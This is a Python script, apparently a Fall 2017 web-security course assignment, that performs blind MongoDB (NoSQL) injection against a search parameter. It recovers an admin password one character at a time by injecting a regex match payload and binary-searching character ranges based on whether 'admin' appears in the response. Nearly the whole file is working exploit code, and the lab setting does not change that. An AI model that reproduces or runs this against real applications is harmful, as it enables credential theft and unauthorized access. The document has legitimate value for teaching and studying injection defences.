#CS510 Web Security Andrew Rogers Program 1
#Fall 2017

'''

target_url = "http://localhost:8000/mongodb/example2/"'''
import requests
import urllib
import sys
from bs4 import BeautifulSoup as soup

full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def build_payload(range_str, known_chars):
	"""Combines the necessary components together and URL encodes them

	Args:
		range_str: the segment of range to be tested by regex
		known_chars: the known characters of the password thus far

	Returns: a URL-encoded string for injection
	"""
	if known_chars:
		temp_payload = "admin' && this.password.match(/^" + known_chars + "[" + range_str + "].*/)//"
	else:
		temp_payload = "admin' && this.password.match(/^[" + range_str + "].*/)//"
	new_payload = {"search" : temp_payload}
	return urllib.parse.urlencode(new_payload)

def test_match(site_url, payload):
	"""Boolean test of a REGEX comparsion using Blind MongoDB injection

	Args:
		site_url: the URL of the website to perform the blind injection
		payload: the URL encoded comparison test string
	"""
	session = requests.Session()
	test_url = site_url + "?" + payload
	print(test_url)
	resp = session.get(test_url)
	test_soup = soup(resp.text, "html.parser")
	if (test_soup.body.find_all(string="admin")):
		return True
	else:
		return False

def match_branch(site_url,test_range, known_chars):
	"""A recursive binary search tree using slices of a given range

		This method is the heart of the program as it lays out the search
		parameters and subdivides the given range to isolate the target

	Args:
		site_url: the URL of the website to perform the blind injection
		test_range: the range used as the source of the REGEX comparison
		known_chars: the known characters of the password thus far

	Returns: The target character to append to the password for later tests

	"""

	goal_char = ""
	if None:
		print("range is empty")
	elif (len(test_range) == 1):
		#The range has been reduced to a single char and a likely target
		if test_match(site_url,build_payload(test_range,known_chars)):
			print("char found: %s" % test_range)
			goal_char = test_range
	else:
		#The range is too large to isolate a character so splicing is needed	
		if test_match(site_url,build_payload(test_range,known_chars)):
			print("found in range %s, testing branches" % test_range)
			half_len_range = int(len(test_range) / 2)
			left_range = test_range[:half_len_range]
			left_goal = match_branch(site_url,left_range,known_chars)
			right_range = test_range[half_len_range:]
			right_goal = match_branch(site_url,right_range,known_chars)
			#The section below coordinates the recursive return calls
			if left_goal:
				goal_char = left_goal
			if right_goal:
				goal_char = right_goal
		else:
			print("not found in %s" % test_range)
	if goal_char or (goal_char == ""):
		return goal_char

def main():
	#Command line argument exception handling
	if len(sys.argv) < 2:
		print ("You failed to provide a target URL on the command line!")
		sys.exit(1)  # abort because of error
	test_url = sys.argv[1]
	if (test_url[:7].lower() != "http://"):
		print("ERROR:: Expecting URL beginning with \'http://\' ")
		sys.exit(1)  # abort because of error

	pwd = "" #the container for the growing password used with the REGEX
	print(full_range)
	print(pwd)
	#The loop for building the character
	while match_branch(test_url,full_range,pwd):
		next_char = match_branch(test_url,full_range,pwd)
		if pwd:
			pwd = pwd + next_char
		else:
			pwd = next_char
		print("pwd is now: %s" % pwd)

	print("The password is: %s" % pwd)
	
if __name__ == '__main__':
	main()